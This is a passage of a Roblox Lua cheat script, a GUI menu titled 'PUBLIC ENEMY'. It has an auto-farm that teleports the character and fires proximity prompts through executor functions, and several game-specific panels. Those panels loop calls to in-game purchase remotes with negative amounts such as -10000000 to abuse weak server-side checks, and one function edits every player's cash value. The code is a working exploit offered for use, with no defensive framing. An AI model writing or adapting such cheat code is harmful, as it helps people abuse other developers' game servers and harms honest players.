local GarbageEvent = ReplicatedStorage:FindFirstChild("GarbageRewardEvent")
local AUTO_FARM = false
local HOVER_HEIGHT = 3
local LOOT_COOLDOWN = 0.05

--================ GUI ==================
local ScreenGui = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
ScreenGui.ResetOnSpawn = false

local Frame = Instance.new("Frame", ScreenGui)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- pure black
Frame.Size = UDim2.new(0, 200, 0, 90)
Frame.Position = UDim2.new(0.4, 0, 0.1, 0)
Frame.Active = true
Frame.Draggable = true

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.3, 0)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.Text = "PUBLIC ENEMY AUTO FARM "
Title.TextColor3 = Color3.new(0,0,0)
Title.Font = Enum.Font.SourceSansBold
Title.TextSize = 16

local AutoFarmBtn = Instance.new("TextButton", Frame)
AutoFarmBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoFarmBtn.Position = UDim2.new(0, 0, 0.3, 0)
AutoFarmBtn.Text = "Auto Farm: OFF"
AutoFarmBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
AutoFarmBtn.TextColor3 = Color3.new(0,0,0)
AutoFarmBtn.Font = Enum.Font.SourceSansBold
AutoFarmBtn.TextSize = 18

local AutoSellBtn = Instance.new("TextButton", Frame)
AutoSellBtn.Size = UDim2.new(1, 0, 0.35, 0)
AutoSellBtn.Position = UDim2.new(0, 0, 0.65, 0)
AutoSellBtn.Text = "Auto Sell Now"
AutoSellBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
AutoSellBtn.TextColor3 = Color3.new(0,0,0)
AutoSellBtn.Font = Enum.Font.SourceSansBold
AutoSellBtn.TextSize = 18

AutoFarmBtn.MouseButton1Click:Connect(function()
    AUTO_FARM = not AUTO_FARM
    AutoFarmBtn.Text = "Auto Farm: " .. (AUTO_FARM and "ON" or "OFF")
end)
--======================================

local function getHRP()
    local char = LP.Character or LP.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local function tpInstant(pos)
    local hrp = getHRP()
    hrp.CFrame = CFrame.new(pos + Vector3.new(0, HOVER_HEIGHT, 0))
    task.wait(0.05)
end

local function triggerPrompt(prompt)
    if fireproximityprompt then
        fireproximityprompt(prompt)
    else
        local old = prompt.HoldDuration
        prompt.HoldDuration = 0
        prompt:InputHoldBegin(); task.wait()
        prompt:InputHoldEnd()
        prompt.HoldDuration = old
    end
end

local function findAllGarbage()
    local list = {}
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local pn = d.Parent and d.Parent.Name:lower() or ""
            if ot:find("garbage") or at:find("garbage") or pn:find("garbage") then
                table.insert(list, d)
            end
        end
    end
    local hrp = getHRP()
    table.sort(list, function(a,b)
        local pa = (a.Parent:IsA("BasePart") and a.Parent or a.Parent:FindFirstChildWhichIsA("BasePart", true))
        local pb = (b.Parent:IsA("BasePart") and b.Parent or b.Parent:FindFirstChildWhichIsA("BasePart", true))
        pa = pa and pa.Position or hrp.Position
        pb = pb and pb.Position or hrp.Position
        return (hrp.Position - pa).Magnitude < (hrp.Position - pb).Magnitude
    end)
    return list
end

local function findSellPrompt()
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("ProximityPrompt") then
            local ot = (d.ObjectText or ""):lower()
            local at = (d.ActionText or ""):lower()
            local nm = (d.Name or ""):lower()
            if (ot..at..nm):find("sell") and (ot..at..nm):find("garbage") then
                return d
            end
        end
    end
end

local function getGarbageTools()
    local t = {}
    local function scan(container)
        for _, v in ipairs(container:GetChildren()) do
            if v:IsA("Tool") and v.Name:lower():find("garbage") then
                table.insert(t, v)
            end
        end
    end
    scan(LP.Backpack)
    if LP.Character then scan(LP.Character) end
    return t
end

local function countGarbageTools()
    return #getGarbageTools()
end

local function collect(prompt)
    local part = prompt.Parent:IsA("BasePart") and prompt.Parent or prompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end
    tpInstant(part.Position)
    triggerPrompt(prompt)
    if GarbageEvent then pcall(function() GarbageEvent:FireServer() end) end
    task.wait(LOOT_COOLDOWN)
end

local function sellAllNow()
    local sellPrompt = findSellPrompt()
    if not sellPrompt then return end
    local part = sellPrompt.Parent:IsA("BasePart") and sellPrompt.Parent or sellPrompt.Parent:FindFirstChildWhichIsA("BasePart", true)
    if not part then return end

    tpInstant(part.Position)
    task.wait(0.2)

    local safety = 0
    while countGarbageTools() > 0 and safety < 200 do
        safety += 1
        local any = getGarbageTools()[1]
        if any then
            if any.Parent ~= LP.Character then
                any.Parent = LP.Character
                task.wait(0.08)
            end
            triggerPrompt(sellPrompt)
            task.wait(0.12)
        else
            break
        end
    end
end

AutoSellBtn.MouseButton1Click:Connect(sellAllNow)

task.spawn(function()
    while task.wait(0.05) do
        if AUTO_FARM then
            local targets = findAllGarbage()
            if #targets > 0 then
                for _, p in ipairs(targets) do
                    if not AUTO_FARM then break end
                    collect(p)
                end
            else
                if countGarbageTools() > 0 then
                    sellAllNow()
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GIVE ALL CASH 10M (MONSY)", function()
	local Players = game:GetService("Players")

local function giveMoneyToAll(amount)
	for _, player in ipairs(Players:GetPlayers()) do
		local stats = player:FindFirstChild("leaderstats")
		if stats then
			local cash = stats:FindFirstChild("Cash")
			if cash then
				cash.Value += amount
			end
		end
	end
end

-- Example: Bigyan lahat ng +10,000,000
giveMoneyToAll(10000000)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BUY GUNSHOP LIST (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY ALL CITY CMD"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silenced Pistol", "Glock-17", "Desert Deagle", "AmmoBox", "Skorpion", "HK416", "UZI"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("CAVITE ROLEPLAY (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 400)
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CAVITE RP"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 14
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Glock-17", "Desert Deagle"}

local selectedGun = nil

-- Dropdown Menu
local dropdownFrame = Instance.new("Frame")
dropdownFrame.Size = UDim2.new(1, -20, 0, #gunList * 25)
dropdownFrame.Position = UDim2.new(0, 10, 0, 85)
dropdownFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame.Visible = false
dropdownFrame.Parent = frame
Instance.new("UICorner", dropdownFrame).CornerRadius = UDim.new(0, 5)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 25)
    btn.Position = UDim2.new(0, 0, 0, (i - 1) * 25)
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = dropdownFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        dropdownFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    dropdownFrame.Visible = not dropdownFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 95 + #gunList * 25

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.GunShop.Events.Purchase:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(0.001)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("BAGONG BARYO SKIN W SOUND (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY SKIN"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"sophia", "daniel", "cuervo", "anghelgirls", "coach", "berto", "jeric", "killua", "alaspogi", "xynu", "chris", "astig", "sup", "licht", "devil", "UZI"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("VENERAL CITY RP (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "GiveAllCashGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 350) -- Adjusted initial height
frame.Position = UDim2.new(0.5, -150, 0.5, -175)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY SKIN"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

-- Dropdown (Select Gun)
local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
dropdown.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown.TextColor3 = Color3.new(0,0,0)
dropdown.Font = Enum.Font.Gotham
dropdown.TextSize = 10
dropdown.Parent = frame
Instance.new("UICorner", dropdown).CornerRadius = UDim.new(0, 6)

local gunList = {"Silencer Magma", "el", "SAY", "Dragonic Silencer", "Dragonic M4", "4Qs", "Aztecas Familia", "Benten", "Flamethrower", "Grenade", "marysing", "Flashbang", "Handcuffs", "Pipe Bomb", "Smoke Grenade"}
local selectedGun = nil

-- Dropdown Menu with ScrollingFrame
local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Size = UDim2.new(1, -20, 0, 150) -- Fixed height with scroll
scrollingFrame.Position = UDim2.new(0, 10, 0, 85)
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
scrollingFrame.Visible = false
scrollingFrame.Parent = frame
scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, #gunList * 20)
scrollingFrame.ScrollBarThickness = 5
Instance.new("UICorner", scrollingFrame).CornerRadius = UDim.new(0, 5)

local uiListLayout = Instance.new("UIListLayout")
uiListLayout.Parent = scrollingFrame
uiListLayout.Padding = UDim.new(0, 2)

for i, gun in ipairs(gunList) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, 20) -- Reduced height
    btn.Text = gun
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 10
    btn.Parent = scrollingFrame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        selectedGun = gun
        dropdown.Text = gun
        scrollingFrame.Visible = false
    end)
end

dropdown.MouseButton1Click:Connect(function()
    scrollingFrame.Visible = not scrollingFrame.Visible
end)

-- Preset Buttons (Aligned)
local buttonSpacing = 5
local buttonWidth = (300 - 40 - (buttonSpacing * 2)) / 3
local buttonYOffset = 245 -- Adjusted based on new layout

local amountBox = Instance.new("TextBox") -- forward declare here so buttons can use it

for i, data in ipairs({
    {Label = "Give 100K", Value = -100000},
    {Label = "Give 1M", Value = -1000000},
    {Label = "Give 10M", Value = -10000000},
}) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, buttonWidth, 0, 30)
    btn.Position = UDim2.new(0, 10 + (buttonWidth + buttonSpacing) * (i - 1), 0, buttonYOffset)
    btn.Text = data.Label
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 12
    btn.Parent = frame
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)

    btn.MouseButton1Click:Connect(function()
        amountBox.Text = tostring(data.Value)
    end)
end

-- Amount Box
amountBox.Size = UDim2.new(1, -20, 0, 30)
amountBox.Position = UDim2.new(0, 10, 0, buttonYOffset + 40)
amountBox.PlaceholderText = "Enter Amount (PUBLIC ENEMY CMD)"
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.new(0,0,0)
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 12
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

-- Auto Give Button
local toggle = Instance.new("TextButton")
toggle.Size = UDim2.new(1, -20, 0, 35)
toggle.Position = UDim2.new(0, 10, 0, buttonYOffset + 80)
toggle.Text = "Start Auto Give"
toggle.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle.TextColor3 = Color3.new(0,0,0)
toggle.Font = Enum.Font.GothamBold
toggle.TextSize = 14
toggle.Parent = frame
Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)

-- Auto Give Logic
local giving = false

toggle.MouseButton1Click:Connect(function()
    giving = not giving
    toggle.Text = giving and "Stop Auto Give" or "Start Auto Give"
    while giving do
        if selectedGun and tonumber(amountBox.Text) then
            ReplicatedStorage.BuyItemRemote:FireServer(selectedGun, tonumber(amountBox.Text))
        end
        task.wait(5)
    end
end)

-- RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

addMainMenuButton("URBAN DECAY RP (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "AutoGiveGuns"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 320)
frame.Position = UDim2.new(0.5, -150, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Active = true
frame.Draggable = true
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY URBAN CMD"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Dropdown Setup
local gunList = {
    "AK-47", "AR15", "Vector", "AmmoBox",
    "Glock-19", "Glock-17", "MP40", "P90",
    "Sten Gun", "Syringe", "Bandage"
}
local selectedGun = nil

local dropdown = Instance.new("TextButton")
dropdown.Size = UDim2.new(1, -20, 0, 30)
dropdown.Position = UDim2.new(0, 10, 0, 50)
dropdown.Text = "Select Gun"
